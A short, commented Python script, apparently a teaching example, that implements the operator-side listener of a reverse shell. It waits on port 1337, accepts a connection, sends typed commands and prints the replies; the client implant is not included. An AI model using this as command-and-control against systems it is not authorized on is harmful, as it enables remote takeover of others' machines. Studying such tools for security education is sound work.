#!/usr/bin/env python3 
import socket 
# importing socket lets you use IPv4 and TCP/IP

# Create a welcome message 
print("Welcome to Secret's Educational Python Reverse Shell!")

# Create a tcp socket using IPv4 
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a local IP and im going to use all Interfaces 
server_socket.bind(("0.0.0.0", 1337 ))

# Start listening for a single incoming connection 
server_socket.listen(1)

print("[*] Waiting for incoming connection on port 1337....")

# Accept a connection from a client 
conn, addr = server_socket.accept()

print(f"[*] Connection established from {addr[0]}:{addr[1]}")

# Enter interactive command loop 
while True:
    try:
        command = input("R_Shell>").strip() #.strip takes away empty commands
    except EOFError:
        print("\n[!] Input Closed unexpectedly.")
        break
    
    if not command:
        continue # Skip empty input 
#    print(f"[Debug] Sending command:{command}")# adding some debugging statements 

    if isinstance(command, str):
        conn.send(command.encode())
    else:
        print("[!] Invalid command. Skipping...")
# If the user enters exit it exits the shell
    if command.lower() == "exit":
        break

    response = conn.recv(4096).decode(errors="ignore")
    print(response)


